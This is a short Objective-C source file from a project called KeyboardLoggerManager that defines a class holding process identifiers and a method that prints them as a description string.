//
//  EmbeddedApplicationInfo.m
//  KeyboardLoggerManager
//
//  Created by Makara Khloth on 4/28/15.
//  Copyright (c) 2015 Makara Khloth. All rights reserved.
//

#import "EmbeddedApplicationInfo.h"

@implementation EmbeddedApplicationInfo
@synthesize mPID, mPSN, mRemotePID;

- (NSString *) description {
    NSString *desc = [NSString stringWithFormat:@"%@, mPID : %d, mPSN : {%d, %d}, mRemotePID : %d", [super description], self.mPID, (unsigned int)self.mPSN.lowLongOfPSN, (unsigned int)self.mPSN.highLongOfPSN, self.mRemotePID];
    return desc;
}

@end
